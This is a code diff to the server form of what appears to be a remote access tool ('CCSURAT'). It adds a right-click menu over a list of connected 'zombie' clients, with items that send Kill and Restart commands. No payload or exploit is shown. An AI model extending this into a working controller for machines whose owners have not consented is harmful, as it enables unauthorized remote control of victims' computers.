@@ -14,6 +14,7 @@ namespace CCSURAT_Server
 
         // Store active connection in a list
         private List<Zombie> zombies = new List<Zombie>();
+        private ListViewHitTestInfo selected;
         public ServerMainForm()
         {
             InitializeComponent();
@@ -48,6 +49,51 @@ namespace CCSURAT_Server
             // appends log data to the console, including time of logging
             console.AppendText("[ " + string.Format("{0:hh:mm:ss tt}", DateTime.Now) + " ] " + s + "\n");
             console.ScrollToCaret();
+        }
+
+        private void zombieListView_MouseDown(object sender, MouseEventArgs e)
+        {
+            if (e.Button == MouseButtons.Right)
+            {
+                selected = zombieListView.HitTest(e.X, e.Y);
+                if (selected.Item != null)
+                {
+                    clientControl.Show(zombieListView, e.Location);
+                }
+                else
+                {
+                }
+            }
+        }
+
+        private void killToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            SendSelected("[[KILL]][[/KILL]]");
+        }
+
+        private void restartToolStripMenuItem_Click(object sender, EventArgs e)
+        {
+            SendSelected("[[RESTART]][[/RESTART]]");
+        }
+
+        private void SendSelected(string s)
+        {
+            ((ZombieListItem)selected.Item).zombieClient.SendData(s);
+        }
+    }
+
+    // custom listitem that contains the zombie client object
+    public class ZombieListItem : ListViewItem
+    {
+        private Zombie zombie;
+        public Zombie zombieClient
+        {
+            get { return zombie; }
+            set { zombie = value; }
+        }
+        public ZombieListItem(Zombie z) : base()
+        {
+            zombie = z;
         }
     }
 }
